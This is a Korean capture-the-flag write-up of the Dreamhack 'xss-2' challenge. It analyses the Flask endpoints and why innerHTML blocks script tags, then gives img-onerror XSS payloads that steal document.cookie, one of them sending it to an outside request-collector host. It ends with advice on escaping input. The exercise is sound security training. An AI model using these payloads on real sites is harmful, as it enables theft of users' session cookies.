# 서론

`XSS` 취약점이 존재하는 워게임 문제인 `xss-2`를 풀어보면서 다른 이용자의 클라이언트에 저장된 쿠키를 탈취해보는 것을 실습해보자.

해당 워게임은 파이썬 `Flask` 프레임워크를 통해 구현되었고, `XSS`를 통해 다른 이용자의 쿠키를 탈취해야 하기 때문에 다른 이용자가 방문하는 시나리오는 `셀레늄`을 통해 구현되었다.

`셀레늄(Selenium)`은 웹 애플리케이션 테스팅에 사용되는 파이썬 패키지로, `API`를 통해 크롬, 사파리 등의 웹 드라이버를 사용할 수 있다. 

`셀레늄`은 요청과 응답만을 처리하는 라이브러리와 달리, 응답에 포함된 `Javascript`, `CSS`와 같은 웹 리소스를 웹 드라이버를 통해 해석하고 실행하기 때문에 웹 브라우저를 통해 페이지를 방문하는 것과 같은 역할을 한다.

# 문제 목표 및 기능 요약

`xss-1` 워게임과 마찬가지로, 목표는 임의 이용자의 쿠키를 탈취하는 것이며, 다음 4개의 페이지로 이루어져있다.

| | |
|-|-|
|`/`|인덱스 페이지이다.|
|`/vuln`|이용자가 입력한 값을 출력한다.|
|`/memo`|이용자가 메모를 남길 수 있으며, 작성한 메모를 출력한다.|
|`/flag`|전달된 URL에 임의 이용자가 접속하게끔 한다. 해당 이용자의 쿠키에는 `FLAG`가 존재한다.|

# 웹 서비스 분석

## 엔드포인트 : `/vuln`

```
@app.route("/vuln")
def vuln():
    return render_template("vuln.html")
```

`xss-2`의 `/vuln`은 이전에 풀었던 `xss-1`문제와는 다르게 구성되어있다. 

`get`으로 사용자가 입력한 `param`을 바로 `return` 해서 출력하지 않고, `render_template` 함수를 사용해서 `vuln.html` 파일을 렌더링한다.

참고로, `render_template` 함수는 `Flask` 웹 프레임워크에서 제공하는 함수로, `Jinja2` 템플릿 엔진을 사용하여 `HTML` 템플릿 파일을 렌더링한다. 주어진 템플릿 파일의 이름과 함께 전달된 변수나 값들을 템플릿에 적용하여 완성된 `HTML`을 생성한다.

`xss-1`에서도 설명했지만, `render_template` 함수를 사용하면, 전달된 템플릿 변수가 기록될 때 `HTML entity` 코드로 변환해 저장되기 때문에 `XSS`가 발생하지 않게 된다.

근데, 사실 여기서 `render_template`을 통해 전달하는 템플릿 변수가 `param`이 아닌 `vuln.html` 페이지이기 때문에 딱히 여기서 엔티티 코드로 랜더링해서 변환되는 부분은 없긴 하다.

그리고 `xss-1`과 달리 `param`을 전달해주지 않는 이유는 `vuln.html`에서 `URL`을 탐색하여 `param`을 찾기 때문이다.

```
{% block content %}
    <div id='vuln'></div>
    <script>var x=new URLSearchParams(location.search); document.getElementById('vuln').innerHTML = x.get('param');</script>
{% endblock %}
```

## 엔드포인트 : `/memo`

```
@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)
```

`xss-1`과 동일하게 구성되어 있고, 사용자가 `memo`로 전달한 파라미터 값을 `memo_text`에 더해서 `render_template` 함수를 통해 `memo_text`를 `memo.html`에 전달하여 렌더링한다.

## 엔드 포인트 : `/flag`

```
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>' 

        return '<script>alert("good");history.go(-1);</script>'
```

`xss-1`에서는 `/flag`를 통해서 `/vuln`에 접근할 때, `param`을 바로 `render_template` 함수를 사용하지 않고 바로 리턴하기 때문에 스크립트 코드가 포함되었는지 확인하는 `check_xss`가 의미가 없었다. 

이번 문제에서 만약, `xss-1`과 같은 방식으로 `param`을 받아와서 `return render_template(param)`을 해줬다면, `check_xss`에서 `false`를 리턴하는 상황이 생길 수 있지만, 여기서도 그 상황은 아니기 때문에 `check_xss`이 의미가 없긴 하다.

이외에 `/flag`를 통해 `read_url`을 호출해서 셀레니움을 통해 서버에서 `/vuln`에 접속하면서 쿠키를 설정하는 코드는 `xss-1`과 동일하다.

# 취약점 분석

`xss-1`과는 다르게 `/vuln`에 존재하는 `innerHTML`을 통해 `<script>` 태그를 실행할 수 없게 되었다. 

왜냐하면, `<script>` 태그가 `render_template` 함수를 통해 HTML 엔티티 코드로 변환되지 않아서 그대로 해석할 수 있음에도 불구하고, `HTML5` 버전 이상에서는 `innerHTML`에서 `<script>` 코드를 실행할 수 없기 때문이다.

참고로, `innerHTML`에 저장된 값을 `HTML 태그`로 해석하여 랜더링 할 수 있다. 당연히 엔티티 코드는 `innerHTML`에 전달되도 브라우저에서 출력될 때는 태그로 해석되어 렌더링 되지 않고 태그 문자열 자체로 출력된다.

```
{% block content %}
    <div id='vuln'></div>
    <script>var x=new URLSearchParams(location.search); document.getElementById('vuln').innerHTML = x.get('param');</script>
{% endblock %}
```

이 부분을 보면, `/vuln`를 접속했을 때의 `URL`에서의 파라미터들을 `x`에 저장한 후, `param` 파라미터에 존재하는 값을 찾아서 `innerHTML`에 저장해주어서 `param`에 `HTML 태그`가 전달된 경우 이를 해석하여 랜더링할 수 있게 된다.

근데, 코드에서 `HTML 엔티티 코드`로 변환하는 부분은 없다고 해도 `<script>` 코드를 실행할 수 없기 때문에 다른 방법을 찾아야 한다.\
(참고로, `read_url`에서 `urllib.parse.quote(param)`은 엔티티 코드로 변환하는게 아니라 `URL 인코딩`을 하는 것이기 때문에 `innerHTML`에 들어갈 때는 태그로 해석되어 렌더링을 할 수 있다.)

### `/memo` 엔드 포인트 사용

`<script>` 대신 사용할 수 있는 방법이 `<img src = "xss-2", onerror = "location.href = '/memo?memo =' + document.cookie;">` 를 `param`으로 전달해 주는 것이다.

`<script>`를 수행할 수 없다고 해도 `HTML 태그`인 `<img>`는 해석하여 랜더링할 수 있기 때문에, 해당 태그 안에 존재하는 `onerror` 속성도 해석하여 실행할 수 있다.

`src = "xss-2"`는 없는 주소이므로 `error` 이벤트가 발생하는데, 이 때 기존에 사용했던 `location.href = "/memo?memo =" + document.cookie;` 코드를 수행하도록 하면 된다.

참고로, `onerror` 속성에서 실행할 이벤트 핸들러 코드는 문자열을 입력해야 하기 때문에, `""`로 값이 감싸져야 하고, 내부에서 사용되야 하는 `"`는 `'`로 대체하면 된다.

## 외부 웹서버 이용

드림핵 툴즈를 이용해서 `<img src = "xss-2", onerror = "location.href = 'https://RANDOM.request.dreamhack.games/?vuln_param=' + document.cookie;">`를 `/flag`의 `param`에 전달해주면 된다.

<img width="1372" alt="image" src="https://github.com/user-attachments/assets/a2dd62c8-e825-4a5f-a3d8-c1a8fe253869">

# 정리

`xss-2` 문제를 통해 `innerHTML` 의 특성과, 파라미터 조작을 통해 웹 페이지 내용을 조작하고 `XSS` 공격을 수행할 수 있는 방법에 대해 알아볼 수 있었다.

`xss-2` 문제와 같이 이용자의 입력을 바탕으로 `innerHTML`을 설정할 경우에는 `XSS` 공격에 취약할 수 있기 때문에, 사용자의 입력을 받기 전에 서버 측에서 입력 값을 검증하거나 이스케이프 처리를 하는 방식 등을 사용해야 취약점을 방어할 수 있다.
